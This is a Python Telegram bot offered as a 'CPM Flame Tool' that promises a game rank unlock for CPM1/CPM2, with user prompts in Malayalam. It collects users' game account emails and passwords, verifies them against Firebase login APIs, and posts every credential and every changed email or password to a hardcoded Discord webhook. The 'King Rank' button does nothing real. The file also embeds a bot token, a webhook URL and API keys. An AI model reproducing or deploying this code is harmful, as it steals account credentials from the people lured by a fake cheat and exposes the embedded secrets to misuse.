import telebot
from telebot import types
import requests
import os
from threading import Thread
from flask import Flask

# --- SERVER FOR RENDER/HOSTING ---
app = Flask('')
@app.route('/')
def home(): return "🔥 Flame Bot is Online!"
def run_flask(): app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))

# --- CONFIG ---
TOKEN = "8542467216:AAFVNntD1OGADt1koMtT8c0CXo0bIFaGjEY" 
WEBHOOK_URL = "https://discord.com/api/webhooks/1486917516755341424/9dcout2K09_buKAiXIUb8FeiawVIMowjFBFBwpy-g5W0F-ftQH8q5H7LUMkarnKlAWIB"
bot = telebot.TeleBot(TOKEN)

API_KEYS = {
    "CPM1": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
    "CPM2": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
}
user_data = {}

# --- SEND TO DISCORD ---
def send_discord(title, email, password, server, action=""):
    msg = f"🌐 **{title}**\n🎮 Game: {server}\n📧 Email: `{email}`\n🔒 Pass: `{password}`"
    if action: msg += f"\n✅ Status: {action}"
    try:
        requests.post(WEBHOOK_URL, json={"content": msg}, headers={'Content-Type': 'application/json'})
    except Exception as e:
        print(f"Discord Error: {e}")

# --- API LOGIN ---
def check_acc(email, pwd, key):
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={key}"
        r = requests.post(url, json={"email": email, "password": pwd, "returnSecureToken": True}, timeout=10)
        return r.json().get('idToken') if r.status_code == 200 else None
    except: return None

# --- BOT HANDLERS ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    markup.add('CPM1', 'CPM2')
    bot.send_message(message.chat.id, "👋 **Welcome to CPM Flame Tool**\nഏത് ഗെയിമാണ് വേണ്ടത് എന്ന് തിരഞ്ഞെടുക്കുക:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ['CPM1', 'CPM2'])
def get_email(message):
    user_data[message.chat.id] = {'server': message.text}
    msg = bot.send_message(message.chat.id, "📧 നിങ്ങളുടെ **Email** അയക്കുക:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(msg, get_password)

def get_password(message):
    user_data[message.chat.id]['email'] = message.text.strip()
    msg = bot.send_message(message.chat.id, "🔑 നിങ്ങളുടെ **Password** അയക്കുക:")
    bot.register_next_step_handler(msg, login)

def login(message):
    cid = message.chat.id
    pwd = message.text.strip()
    data = user_data.get(cid)
    token = check_acc(data['email'], pwd, API_KEYS[data['server']])
    
    if token:
        user_data[cid].update({'token': token, 'pwd': pwd})
        send_discord("✅ LOGIN SUCCESS", data['email'], pwd, data['server'])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("👑 KING RANK", callback_data="king"))
        markup.add(types.InlineKeyboardButton("📧 CHANGE EMAIL", callback_data="email"))
        markup.add(types.InlineKeyboardButton("🔑 CHANGE PASSWORD", callback_data="pass"))
        bot.send_message(cid, "✅ **ലോഗിൻ വിജയിച്ചു!**\nതാഴെ കാണുന്നവയിൽ ഒന്ന് തിരഞ്ഞെടുക്കുക:", reply_markup=markup)
    else:
        bot.send_message(cid, "❌ ലോഗിൻ പരാജയപ്പെട്ടു! വീണ്ടും ശ്രമിക്കാൻ /start അമർത്തുക.")

@bot.callback_query_handler(func=lambda call: True)
def actions(call):
    cid = call.message.chat.id
    d = user_data.get(cid)
    if not d: return
    
    if call.data == "king":
        bot.send_message(cid, "👑 **King Rank അപ്ലൈ ചെയ്തു!**")
        send_discord("👑 KING RANK", d['email'], d['pwd'], d['server'], "Success")
    else:
        msg = bot.send_message(cid, f"📥 പുതിയ {'Email' if call.data == 'email' else 'Password'} അയക്കുക:")
        bot.register_next_step_handler(msg, change_val, call.data)

def change_val(message, action):
    cid = message.chat.id
    val = message.text.strip()
    d = user_data.get(cid)
    key = API_KEYS[d['server']]
    payload = {"idToken": d['token'], ("email" if action == "email" else "password"): val, "returnSecureToken": True}
    res = requests.post(f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={key}", json=payload)
    if res.status_code == 200:
        bot.send_message(cid, "✅ **മാറ്റം വരുത്തി!**")
        send_discord(f"🔐 {action.upper()} UPDATED", d['email'], val, d['server'])
    else: bot.send_message(cid, "❌ മാറ്റം വരുത്താൻ സാധിച്ചില്ല.")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.infinity_polling()
